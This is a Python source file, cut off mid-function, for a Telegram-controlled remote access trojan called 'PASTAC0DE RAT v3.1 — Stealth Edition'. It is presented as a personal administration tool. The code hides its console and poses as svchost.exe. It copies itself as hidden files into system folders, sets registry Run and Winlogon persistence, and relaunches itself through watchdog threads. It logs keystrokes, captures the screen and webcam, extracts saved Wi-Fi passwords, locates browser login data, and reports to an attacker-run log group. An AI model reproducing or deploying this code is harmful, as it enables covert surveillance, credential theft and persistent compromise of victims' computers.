#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PASTAC0DE RAT v3.1 — Stealth Edition
Remote administration tool for personal use
"""

import os, sys, subprocess, shutil, zipfile, logging, tempfile, time, json, socket, platform, getpass, uuid, threading, base64, ctypes, re, random, string, hashlib, warnings, traceback, pathlib, datetime, winreg, win32api, win32con, win32gui, win32process

warnings.filterwarnings("ignore")

# ============ OPTIONAL IMPORTS ============
try:
    import telebot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    TELEBOT_OK = True
except:
    TELEBOT_OK = False

try:
    from PIL import ImageGrab, Image
    PIL_OK = True
except:
    PIL_OK = False

try:
    import pyautogui
    PYAUTO_OK = True
except:
    PYAUTO_OK = False

try:
    import psutil
    PSUTIL_OK = True
except:
    PSUTIL_OK = False

try:
    import cv2
    CV2_OK = True
except:
    CV2_OK = False

try:
    import requests
    REQUESTS_OK = True
except:
    REQUESTS_OK = False

try:
    from supabase import create_client
    SUPABASE_OK = True
except:
    SUPABASE_OK = False

try:
    import pynput.keyboard as pynput_kb
    PYNPUT_OK = True
except:
    PYNPUT_OK = False

try:
    import pyperclip
    CLIPBOARD_OK = True
except:
    CLIPBOARD_OK = False

# ============ STEALTH UTILS ============
class StealthUtils:
    @staticmethod
    def hide_console():
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
                ctypes.windll.user32.SetWindowPos(hwnd, None, 0, 0, 0, 0, 0x80)
        except:
            pass

    @staticmethod
    def masquerade_process():
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        except:
            pass

    @staticmethod
    def get_system_paths():
        user = getpass.getuser()
        return [
            os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
            os.path.expandvars(r"%LOCALAPPDATA%\Temp"),
            os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\StartUp"),
            r"C:\Windows\System32\Tasks",
            r"C:\Windows\Temp",
            os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes"),
        ]

    @staticmethod
    def spread_to_system():
        try:
            exe_path = sys.executable
            if exe_path.endswith(".exe"):
                for folder in StealthUtils.get_system_paths():
                    try:
                        os.makedirs(folder, exist_ok=True)
                        dest = os.path.join(folder, "svchost.exe")
                        if not os.path.exists(dest):
                            shutil.copy2(exe_path, dest)
                            os.system('attrib +h +s "%s"' % dest)
                    except:
                        pass
            return True
        except:
            return False

    @staticmethod
    def add_registry_persistence():
        try:
            exe_path = sys.executable
            keys = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemService"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"),
            ]
            for hkey, path, name in keys:
                try:
                    key = winreg.OpenKey(hkey, path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
                    winreg.CloseKey(key)
                except:
                    pass
            return True
        except:
            return False

    @staticmethod
    def is_process_running(name="svchost.exe"):
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == name:
                    return True
            return False
        except:
            return False

    @staticmethod
    def watchdog_loop():
        while True:
            try:
                if not StealthUtils.is_process_running():
                    for folder in StealthUtils.get_system_paths():
                        backup = os.path.join(folder, "svchost.exe")
                        if os.path.exists(backup):
                            subprocess.Popen([backup], creationflags=0x08000000)
                            break
            except:
                pass
            time.sleep(30)

    @staticmethod
    def self_defense():
        def defender():
            while True:
                try:
                    exe_path = sys.executable
                    if not os.path.exists(exe_path):
                        for folder in StealthUtils.get_system_paths():
                            backup = os.path.join(folder, "svchost.exe")
                            if os.path.exists(backup):
                                shutil.copy2(backup, exe_path)
                                subprocess.Popen([exe_path], creationflags=0x08000000)
                                break
                except:
                    pass
                time.sleep(10)
        threading.Thread(target=defender, daemon=True).start()

    @staticmethod
    def enable_stealth():
        StealthUtils.hide_console()
        StealthUtils.masquerade_process()
        StealthUtils.spread_to_system()
        StealthUtils.add_registry_persistence()
        StealthUtils.self_defense()
        threading.Thread(target=StealthUtils.watchdog_loop, daemon=True).start()
        return True

# ============ CONFIG ============
EMBEDDED_CONFIG = {
    "bot_token": "YOUR_BOT_TOKEN_HERE",
    "allowed_chat_id": "",
    "log_group_id": "",
    "supabase_url": "",
    "supabase_key": "",
    "access_key": "",
}

CONFIG_PATH = pathlib.Path(__file__).parent / "config.ini"
if CONFIG_PATH.exists():
    import configparser
    cfg = configparser.ConfigParser()
    cfg.read(CONFIG_PATH, encoding="utf-8")
    if cfg.has_section("Settings"):
        for k in EMBEDDED_CONFIG:
            if cfg.has_option("Settings", k):
                EMBEDDED_CONFIG[k] = cfg.get("Settings", k, fallback="")

BOT_TOKEN = EMBEDDED_CONFIG.get("bot_token", "").strip()
ALLOWED_CHAT_ID = EMBEDDED_CONFIG.get("allowed_chat_id", "").strip()
LOG_GROUP_ID = EMBEDDED_CONFIG.get("log_group_id", "").strip()
SUPABASE_URL = EMBEDDED_CONFIG.get("supabase_url", "").strip()
SUPABASE_KEY = EMBEDDED_CONFIG.get("supabase_key", "").strip()
ACCESS_KEY = EMBEDDED_CONFIG.get("access_key", "").strip()

if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("[!] BOT_TOKEN not configured!")
    sys.exit(1)

if not ACCESS_KEY:
    ACCESS_KEY = str(uuid.uuid4())[:16].upper()

for name, var in [("ALLOWED_CHAT_ID", ALLOWED_CHAT_ID), ("LOG_GROUP_ID", LOG_GROUP_ID)]:
    try:
        globals()[name] = int(var) if var else None
    except:
        globals()[name] = None

# ============ LOGGING ============
log_dir = pathlib.Path(tempfile.gettempdir()) / "syslogs"
log_dir.mkdir(exist_ok=True)
log_file = log_dir / ("svc_" + datetime.datetime.now().strftime("%Y%m%d") + ".log")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(str(log_file), encoding="utf-8"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ============ SUPABASE ============
supabase = None
if SUPABASE_OK and SUPABASE_URL and SUPABASE_KEY:
    try:
        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
        logger.info("Supabase connected")
    except Exception as e:
        logger.error("Supabase failed: %s" % e)

# ============ PC ID ============
PC_ID = str(uuid.uuid4())[:8]
PC_NAME = socket.gethostname()
PC_USER = getpass.getuser()
PC_FULL_NAME = "%s_%s_%s" % (PC_NAME, PC_USER, PC_ID)

# ============ AUTH ============
authorized_users = {}
keylogger_buffer = {}
clipboard_history = []

# ============ KEYBOARD LOGGER ============
if PYNPUT_OK:
    def on_key_press(key):
        global keylogger_buffer
        try:
            char = key.char
        except:
            char = str(key)
        for uid in authorized_users:
            if uid not in keylogger_buffer:
                keylogger_buffer[uid] = []
            keylogger_buffer[uid].append(char)
            if len(keylogger_buffer[uid]) > 500:
                keylogger_buffer[uid] = keylogger_buffer[uid][-500:]

    keylogger_listener = pynput_kb.Listener(on_press=on_key_press)
    keylogger_listener.start()

# ============ FUNCTIONS ============

def register_pc():
    if not supabase:
        return False
    try:
        data = {
            "pc_id": PC_ID,
            "pc_name": PC_FULL_NAME,
            "access_key": ACCESS_KEY,
            "user_chat_id": None,
            "is_active": True,
        }
        supabase.table("pc_keys").upsert(data).execute()
        return True
    except:
        return False

def verify_key(chat_id, key_input):
    if chat_id in authorized_users:
        return authorized_users[chat_id].get("authenticated", False)
    if supabase:
        try:
            result = supabase.table("pc_keys").select("*").eq("access_key", key_input).eq("is_active", True).execute()
            if result.data:
                pc = result.data[0]
                supabase.table("pc_keys").update({"user_chat_id": str(chat_id)}).eq("access_key", key_input).execute()
                authorized_users[chat_id] = {"pc_id": pc["pc_id"], "access_key": key_input, "authenticated": True}
                return True
        except:
            pass
    if key_input == ACCESS_KEY:
        authorized_users[chat_id] = {"pc_id": PC_ID, "access_key": key_input, "authenticated": True}
        return True
    return False

def is_auth(chat_id):
    return authorized_users.get(chat_id, {}).get("authenticated", False)

def get_pc_info():
    info = {
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "platform": platform.platform(),
        "processor": platform.processor(),
        "machine": platform.machine(),
        "python_version": platform.python_version(),
        "pc_id": PC_ID,
        "pc_full_name": PC_FULL_NAME,
    }
    if PSUTIL_OK:
        try:
            info["cpu_count"] = psutil.cpu_count(logical=True)
            info["cpu_freq"] = str(int(psutil.cpu_freq().current)) + " MHz" if psutil.cpu_freq() else "N/A"
            info["cpu_percent"] = str(psutil.cpu_percent(interval=0.1)) + "%"
            mem = psutil.virtual_memory()
            info["ram_total"] = "%.1f GB" % (mem.total / (1024**3))
            info["ram_used"] = "%.1f GB" % (mem.used / (1024**3))
            info["ram_percent"] = str(mem.percent) + "%"
            disks = []
            for part in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    disks.append(part.device + " " + str(usage.percent) + "% used")
                except:
                    pass
            info["disks"] = "; ".join(disks) if disks else "N/A"
            info["boot_time"] = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        except:
            pass
    try:
        info["local_ip"] = socket.gethostbyname(socket.gethostname())
    except:
        pass
    if REQUESTS_OK:
        try:
            info["public_ip"] = requests.get("https://api.ipify.org", timeout=5).text
        except:
            pass
    return info

def log_action(message, action, details=""):
    user = message.from_user
    pc = get_pc_info()
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logger.info("[LOG] PC=%s user=%s action=%s" % (PC_FULL_NAME, user.username or "N/A", action))

    def send():
        lines = [
            "=" * 40,
            "DETAILED ACTION LOG",
            "=" * 40,
            "TIME: " + ts,
            "PC: " + pc.get("pc_full_name", "N/A") + " (ID: " + pc.get("pc_id", "N/A") + ")",
            "ACTION: " + action,
            "DETAILS: " + (details or "None"),
            "",
            "--- USER ---",
            "User ID: " + str(user.id),
            "Username: @" + (user.username or "N/A"),
            "Name: " + (user.first_name or "") + " " + (user.last_name or ""),
            "Chat ID: " + str(message.chat.id),
            "",
            "--- PC ---",
            "Hostname: " + pc.get("hostname", "N/A"),
            "User: " + pc.get("username", "N/A"),
            "OS: " + pc.get("platform", "N/A"),
            "CPU: " + str(pc.get("cpu_count", "N/A")) + " cores",
            "RAM: " + str(pc.get("ram_used", "N/A")) + " / " + str(pc.get("ram_total", "N/A")),
            "Local IP: " + str(pc.get("local_ip", "N/A")),
            "Public IP: " + str(pc.get("public_ip", "N/A")),
            "=" * 40,
        ]
        txt = "\n".join(lines)
        if LOG_GROUP_ID and TELEBOT_OK:
            try:
                bot.send_message(LOG_GROUP_ID, txt[:4000] + ("\n... (truncated)" if len(txt) > 4000 else ""))
            except:
                pass
    threading.Thread(target=send, daemon=True).start()

# ============ KEYBOARDS ============
def auth_menu():
    m = InlineKeyboardMarkup(row_width=1)
    m.add(InlineKeyboardButton("Enter Access Key", callback_data="enter_key"))
    return m

def main_menu():
    m = InlineKeyboardMarkup(row_width=3)
    m.add(
        InlineKeyboardButton("System", callback_data="menu_system"),
        InlineKeyboardButton("Files", callback_data="menu_files"),
        InlineKeyboardButton("Processes", callback_data="menu_processes"),
        InlineKeyboardButton("Keyboard", callback_data="menu_keyboard"),
        InlineKeyboardButton("Screenshot", callback_data="screenshot"),
        InlineKeyboardButton("Webcam", callback_data="photo"),
        InlineKeyboardButton("PC Info", callback_data="pc_info"),
        InlineKeyboardButton("My PCs", callback_data="my_pcs"),
        InlineKeyboardButton("Advanced", callback_data="menu_advanced"),
    )
    return m

def system_menu():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("Shutdown", callback_data="shutdown"),
        InlineKeyboardButton("Reboot", callback_data="reboot"),
        InlineKeyboardButton("Sleep", callback_data="sleep"),
        InlineKeyboardButton("Lock", callback_data="lock"),
        InlineKeyboardButton("CMD", callback_data="cmd_prompt"),
        InlineKeyboardButton("PowerShell", callback_data="powershell_prompt"),
        InlineKeyboardButton("Process List", callback_data="process_list"),
        InlineKeyboardButton("Services", callback_data="services_list"),
        InlineKeyboardButton("Network", callback_data="network_info"),
        InlineKeyboardButton("WiFi", callback_data="wifi_info"),
        InlineKeyboardButton("Users", callback_data="users_list"),
        InlineKeyboardButton("Back", callback_data="main_menu"),
    )
    return m

def files_menu():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("List Files", callback_data="files_list"),
        InlineKeyboardButton("Create Folder", callback_data="mkdir_prompt"),
        InlineKeyboardButton("Create File", callback_data="touch_prompt"),
        InlineKeyboardButton("Delete", callback_data="del_prompt"),
        InlineKeyboardButton("Zip", callback_data="zip_prompt"),
        InlineKeyboardButton("Unzip", callback_data="unzip_prompt"),
        InlineKeyboardButton("Download", callback_data="download_prompt"),
        InlineKeyboardButton("Upload", callback_data="upload_prompt"),
        InlineKeyboardButton("Search", callback_data="search_prompt"),
        InlineKeyboardButton("Back", callback_data="main_menu"),
    )
    return m

def processes_menu():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("Run App", callback_data="run_prompt"),
        InlineKeyboardButton("Kill Process", callback_data="kill_prompt"),
        InlineKeyboardButton("Kill PID", callback_data="killpid_prompt"),
        InlineKeyboardButton("Process List", callback_data="process_list"),
        InlineKeyboardButton("Tree", callback_data="process_tree"),
        InlineKeyboardButton("Back", callback_data="main_menu"),
    )
    return m

def keyboard_menu():
    m = InlineKeyboardMarkup(row_width=3)
    m.add(
        InlineKeyboardButton("Win+R", callback_data="hotkey_win_r"),
        InlineKeyboardButton("Alt+F4", callback_data="hotkey_alt_f4"),
        InlineKeyboardButton("Ctrl+Shift+Esc", callback_data="hotkey_ctrl_shift_esc"),
        InlineKeyboardButton("Enter", callback_data="hotkey_enter"),
        InlineKeyboardButton("Tab", callback_data="hotkey_tab"),
        InlineKeyboardButton("Esc", callback_data="hotkey_esc"),
        InlineKeyboardButton("Space", callback_data="hotkey_space"),
        InlineKeyboardButton("Win+D", callback_data="hotkey_win_d"),
        InlineKeyboardButton("Ctrl+C", callback_data="hotkey_ctrl_c"),
        InlineKeyboardButton("Ctrl+V", callback_data="hotkey_ctrl_v"),
        InlineKeyboardButton("Ctrl+A", callback_data="hotkey_ctrl_a"),
        InlineKeyboardButton("Ctrl+Z", callback_data="hotkey_ctrl_z"),
        InlineKeyboardButton("Win+L", callback_data="hotkey_win_l"),
        InlineKeyboardButton("Win+E", callback_data="hotkey_win_e"),
        InlineKeyboardButton("Type Text", callback_data="type_prompt"),
        InlineKeyboardButton("Custom Hotkey", callback_data="hotkey_custom_prompt"),
        InlineKeyboardButton("Keylogger", callback_data="keylogger_menu"),
        InlineKeyboardButton("Clipboard", callback_data="clipboard_menu"),
        InlineKeyboardButton("Back", callback_data="main_menu"),
    )
    return m

def keylogger_menu():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("Get Logs", callback_data="keylogger_get"),
        InlineKeyboardButton("Clear Logs", callback_data="keylogger_clear"),
        InlineKeyboardButton("Status", callback_data="keylogger_status"),
        InlineKeyboardButton("Back", callback_data="menu_keyboard"),
    )
    return m

def clipboard_menu():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("Get Clipboard", callback_data="clipboard_get"),
        InlineKeyboardButton("Set Clipboard", callback_data="clipboard_set_prompt"),
        InlineKeyboardButton("History", callback_data="clipboard_history"),
        InlineKeyboardButton("Back", callback_data="menu_keyboard"),
    )
    return m

def advanced_menu():
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("Audio Record", callback_data="audio_record_prompt"),
        InlineKeyboardButton("Screen Record", callback_data="screen_record_prompt"),
        InlineKeyboardButton("WiFi Passwords", callback_data="wifi_passwords"),
        InlineKeyboardButton("Browser Data", callback_data="browser_data"),
        InlineKeyboardButton("Reverse Shell", callback_data="shell_prompt"),
        InlineKeyboardButton("Enable Stealth", callback_data="stealth_enable"),
        InlineKeyboardButton("Self Destruct", callback_data="self_destruct"),
        InlineKeyboardButton("Back", callback_data="main_menu"),
    )
    return m

# ============ BOT ============
if not TELEBOT_OK:
    print("[!] telebot not installed!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
CURRENT_DIR = pathlib.Path.home()
register_pc()

user_states = {}

# ============ HANDLERS ============

@bot.message_handler(commands=["start"])
def cmd_start(message):
    chat_id = message.chat.id
    if is_auth(chat_id):
        log_action(message, "/start", "Authenticated user returned")
        bot.send_message(chat_id,
            "<b>PASTAC0DE RAT v3.1</b>\n\n"
            "Connected: <code>%s</code>\n"
            "PC ID: <code>%s</code>\n\n"
            "Choose action:" % (PC_FULL_NAME, PC_ID),
            reply_markup=main_menu())
        return
    bot.send_message(chat_id,
        "<b>PASTAC0DE RAT v3.1</b>\n\n"
        "Protected by access key.\n\n"
        "PC: <code>%s</code>\n"
        "ID: <code>%s</code>\n\n"
        "Click 'Enter Access Key' to authenticate." % (PC_FULL_NAME, PC_ID),
        reply_markup=auth_menu())

@bot.message_handler(commands=["key"])
def cmd_key(message):
    chat_id = message.chat.id
    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /key YOUR_ACCESS_KEY")
        return
    key_input = parts[1].strip().upper()
    if verify_key(chat_id, key_input):
        bot.reply_to(message, "Access granted! Welcome.", reply_markup=main_menu())
        log_action(message, "AUTH_SUCCESS", "Key: " + key_input)
    else:
        bot.reply_to(message, "Invalid or expired key.")
        log_action(message, "AUTH_FAILED", "Key: " + key_input)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    message = call.message
    chat_id = message.chat.id
    data = call.data

    if data != "enter_key" and not is_auth(chat_id):
        bot.answer_callback_query(call.id, "Access denied! Enter key first.")
        return

    if data == "enter_key":
        user_states[chat_id] = {"action": "ENTER_KEY"}
        bot.send_message(chat_id, "Enter your access key:")
        bot.answer_callback_query(call.id)
        return

    if data == "main_menu":
        log_action(message, "MENU", "Back to main")
        bot.delete_message(chat_id, message.message_id)
        bot.send_message(chat_id, "<b>Main Menu</b>\n\nChoose action:", reply_markup=main_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "menu_system":
        log_action(message, "MENU_SYSTEM", "Opened")
        bot.delete_message(chat_id, message.message_id)
        bot.send_message(chat_id, "<b>System Menu</b>", reply_markup=system_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "menu_files":
        log_action(message, "MENU_FILES", "Opened")
        bot.delete_message(chat_id, message.message_id)
        bot.send_message(chat_id, "<b>Files Menu</b>\nCurrent: <code>%s</code>" % CURRENT_DIR, reply_markup=files_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "menu_processes":
        log_action(message, "MENU_PROCESSES", "Opened")
        bot.delete_message(chat_id, message.message_id)
        bot.send_message(chat_id, "<b>Processes Menu</b>", reply_markup=processes_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "menu_keyboard":
        log_action(message, "MENU_KEYBOARD", "Opened")
        bot.delete_message(chat_id, message.message_id)
        bot.send_message(chat_id, "<b>Keyboard Menu</b>", reply_markup=keyboard_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "menu_advanced":
        log_action(message, "MENU_ADVANCED", "Opened")
        bot.delete_message(chat_id, message.message_id)
        bot.send_message(chat_id, "<b>Advanced Menu</b>", reply_markup=advanced_menu())
        bot.answer_callback_query(call.id)
        return

    # System actions
    if data == "shutdown":
        log_action(message, "SHUTDOWN", "Requested")
        bot.send_message(chat_id, "<b>WARNING!</b>\n%s will shutdown in 10s!" % PC_FULL_NAME, reply_markup=main_menu())
        subprocess.Popen('shutdown /s /t 10 /c "Shutdown via RAT"', shell=True)
        bot.answer_callback_query(call.id)
        return

    if data == "reboot":
        log_action(message, "REBOOT", "Requested")
        bot.send_message(chat_id, "<b>WARNING!</b>\n%s will reboot in 10s!" % PC_FULL_NAME, reply_markup=main_menu())
        subprocess.Popen('shutdown /r /t 10 /c "Reboot via RAT"', shell=True)
        bot.answer_callback_query(call.id)
        return

    if data == "sleep":
        log_action(message, "SLEEP", "Requested")
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        bot.answer_callback_query(call.id, "Sleep initiated")
        return

    if data == "lock":
        log_action(message, "LOCK", "Requested")
        os.system("rundll32.exe user32.dll,LockWorkStation")
        bot.answer_callback_query(call.id, "Workstation locked")
        return

    if data == "services_list":
        log_action(message, "SERVICES", "Requested")
        try:
            result = subprocess.run("sc query", shell=True, capture_output=True, text=True, timeout=30)
            text = "<b>Services</b>\n\n<pre>%s</pre>" % result.stdout[:3500]
            bot.send_message(chat_id, text, reply_markup=system_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=system_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "network_info":
        log_action(message, "NETWORK", "Requested")
        try:
            result = subprocess.run("ipconfig /all", shell=True, capture_output=True, text=True, timeout=30)
            text = "<b>Network</b>\n\n<pre>%s</pre>" % result.stdout[:3500]
            bot.send_message(chat_id, text, reply_markup=system_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=system_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "wifi_info":
        log_action(message, "WIFI", "Requested")
        try:
            result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True, timeout=30)
            text = "<b>WiFi Profiles</b>\n\n<pre>%s</pre>" % result.stdout[:3500]
            bot.send_message(chat_id, text, reply_markup=system_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=system_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "wifi_passwords":
        log_action(message, "WIFI_PASSWORDS", "Requested")
        try:
            profiles = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True, timeout=30)
            passwords = []
            for line in profiles.stdout.split("\n"):
                if "All User Profile" in line or "Профиль всех пользователей" in line:
                    ssid = line.split(":")[1].strip()
                    try:
                        profile = subprocess.run('netsh wlan show profile name="%s" key=clear' % ssid, shell=True, capture_output=True, text=True, timeout=10)
                        for pline in profile.stdout.split("\n"):
                            if "Key Content" in pline or "Содержимое ключа" in pline:
                                pwd = pline.split(":")[1].strip()
                                passwords.append("%s: %s" % (ssid, pwd))
                    except:
                        pass
            if passwords:
                text = "<b>WiFi Passwords</b>\n\n<code>%s</code>" % "\n".join(passwords)
            else:
                text = "<b>No WiFi passwords found</b>"
            bot.send_message(chat_id, text, reply_markup=advanced_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=advanced_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "users_list":
        log_action(message, "USERS", "Requested")
        try:
            result = subprocess.run("net user", shell=True, capture_output=True, text=True, timeout=30)
            text = "<b>Users</b>\n\n<pre>%s</pre>" % result.stdout[:3500]
            bot.send_message(chat_id, text, reply_markup=system_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=system_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "browser_data":
        log_action(message, "BROWSER_DATA", "Requested")
        try:
            paths = {
                "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
                "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
                "Firefox": os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
            }
            text = "<b>Browser Data</b>\n\n"
            for name, path in paths.items():
                if os.path.exists(path):
                    files = os.listdir(path)
                    history = "History" in files
                    cookies = "Cookies" in files
                    logins = "Login Data" in files
                    text += "%s:\n- History: %s\n- Cookies: %s\n- Logins: %s\n\n" % (name, history, cookies, logins)
                else:
                    text += "%s: Not installed\n\n" % name
            bot.send_message(chat_id, text, reply_markup=advanced_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=advanced_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "stealth_enable":
        log_action(message, "STEALTH_ENABLE", "Requested")
        try:
            result = StealthUtils.enable_stealth()
            if result:
                text = "<b>Stealth Mode Enabled</b>\n\n"
                text += "Console: Hidden\n"
                text += "Process: Masqueraded as svchost.exe\n"
                text += "Registry: Persistence added\n"
                text += "Spread: Copied to system folders\n"
                text += "Watchdog: Active\n"
                text += "Self-defense: Active"
            else:
                text = "<b>Stealth Mode Failed</b>"
            bot.send_message(chat_id, text, reply_markup=advanced_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=advanced_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "self_destruct":
        log_action(message, "SELF_DESTRUCT", "Requested")
        bot.send_message(chat_id, "<b>SELF DESTRUCT INITIATED</b>\n\nCleaning traces...", reply_markup=main_menu())
        try:
            exe_path = sys.executable
            for folder in StealthUtils.get_system_paths():
                backup = os.path.join(folder, "svchost.exe")
                if os.path.exists(backup):
                    try:
                        os.remove(backup)
                    except:
                        pass
            keys = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsUpdate"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemService"),
            ]
            for hkey, path, name in keys:
                try:
                    key = winreg.OpenKey(hkey, path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                except:
                    pass
            bot.send_message(chat_id, "<b>Traces cleaned. Exiting...</b>")
            time.sleep(2)
            os._exit(0)
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e))
        return

    # Files
    if data == "files_list":
        log_action(message, "FILES_LIST", str(CURRENT_DIR))
        try:
            items = list(CURRENT_DIR.iterdir())
            if not items:
                bot.send_message(chat_id, "Empty folder", reply_markup=files_menu())
                bot.answer_callback_query(call.id)
                return
            lines = []
            for item in items:
                icon = "[DIR]" if item.is_dir() else "[FILE]"
                size = ""
                if item.is_file():
                    try:
                        sz = item.stat().st_size
                        if sz < 1024:
                            size = " (%d B)" % sz
                        elif sz < 1024*1024:
                            size = " (%.1f KB)" % (sz/1024)
                        else:
                            size = " (%.1f MB)" % (sz/(1024*1024))
                    except:
                        pass
                lines.append(icon + " " + item.name + size)
            text = "<b>%s</b>\n\n" % CURRENT_DIR + "\n".join(lines)
            if len(text) > 4000:
                text = text[:4000] + "\n\n... (too many)"
            bot.send_message(chat_id, text, reply_markup=files_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=files_menu())
        bot.answer_callback_query(call.id)
        return

    # Processes
    if data == "process_list":
        log_action(message, "PROCESS_LIST", "Requested")
        if not PSUTIL_OK:
            bot.send_message(chat_id, "psutil not installed!", reply_markup=processes_menu())
            return
        try:
            procs = []
            for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    procs.append("%s (PID:%s) CPU:%.1f%% MEM:%.1f%%" % (
                        p.info['name'], p.info['pid'],
                        p.info.get('cpu_percent', 0),
                        p.info.get('memory_percent', 0)
                    ))
                except:
                    pass
            text = "<b>Processes</b>\n\n" + "\n".join(procs[:40])
            if len(procs) > 40:
                text += "\n\n... and %d more" % (len(procs)-40)
            if len(text) > 4000:
                text = text[:4000] + "\n... (truncated)"
            bot.send_message(chat_id, text, reply_markup=processes_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=processes_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "process_tree":
        log_action(message, "PROCESS_TREE", "Requested")
        try:
            result = subprocess.run("wmic process get ParentProcessId,ProcessId,Name", shell=True, capture_output=True, text=True, timeout=30)
            text = "<b>Process Tree</b>\n\n<pre>%s</pre>" % result.stdout[:3500]
            bot.send_message(chat_id, text, reply_markup=processes_menu())
        except Exception as e:
            bot.send_message(chat_id, "Error: " + str(e), reply_markup=processes_menu())
        bot.answer_callback_query(call.id)
        return

    # Keyboard
    if data == "keylogger_menu":
        log_action(message, "KEYLOGGER_MENU", "Opened")
        bot.delete_message(chat_id, message.message_id)
        bot.send_message(chat_id, "<b>Keylogger Menu</b>", reply_markup=keylogger_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "keylogger_get":
        log_action(message, "KEYLOGGER_GET", "Requested")
        logs = keylogger_buffer.get(chat_id, [])
        if logs:
            text = "<b>Keylogger Logs</b>\n\n<code>%s</code>" % "".join(logs)[-3000:]
        else:
            text = "<b>No logs yet</b>"
        bot.send_message(chat_id, text, reply_markup=keylogger_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "keylogger_clear":
        log_action(message, "KEYLOGGER_CLEAR", "Requested")
        keylogger_buffer[chat_id] = []
        bot.send_message(chat_id, "<b>Keylogger logs cleared!</b>", reply_markup=keylogger_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "keylogger_status":
        log_action(message, "KEYLOGGER_STATUS", "Requested")
        status = "Active" if PYNPUT_OK else "Not available"
        count = len(keylogger_buffer.get(chat_id, []))
        bot.send_message(chat_id, "<b>Keylogger Status</b>\nStatus: %s\nLogged keys: %d" % (status, count), reply_markup=keylogger_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "clipboard_menu":
        log_action(message, "CLIPBOARD_MENU", "Opened")
        bot.delete_message(chat_id, message.message_id)
        bot.send_message(chat_id, "<b>Clipboard Menu</b>", reply_markup=clipboard_menu())
        bot.answer_callback_query(call.id)
        return

    if data == "clipboard_get":
        log_action(message, "CLIPBOARD_GET", "Requested")
        if CLIPBOARD_OK:
